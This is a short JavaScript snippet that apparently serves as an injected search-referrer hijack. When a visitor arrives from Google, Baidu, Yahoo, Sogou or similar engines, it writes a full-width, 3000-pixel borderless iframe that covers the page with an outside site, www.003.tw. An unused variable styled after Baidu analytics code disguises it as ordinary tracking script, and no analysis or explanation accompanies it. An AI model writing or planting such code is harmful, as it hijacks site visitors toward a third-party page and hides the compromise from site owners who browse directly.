if(window.name != 'ad_app6'){
 var r = document.referrer;
 r = r.toLowerCase();
 var aSites = new Array('google.','baidu.','soso.','so.','360.','yahoo.','youdao.','sogou.','gougou.');
 var b = false;
 for (i in aSites){
  if (r.indexOf(aSites[i]) > 0){
   b = true;
   break;
  }
 }
 
 if(b)
 {
var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
	document.write("<Iframe src=\"http://www.003.tw\" width=\"100%\" height=\"3000\"   scrolling=\"no\"  frameborder=\"0\"></Iframe>");
	window.adworkergo = 'ad_app6';
 }
}
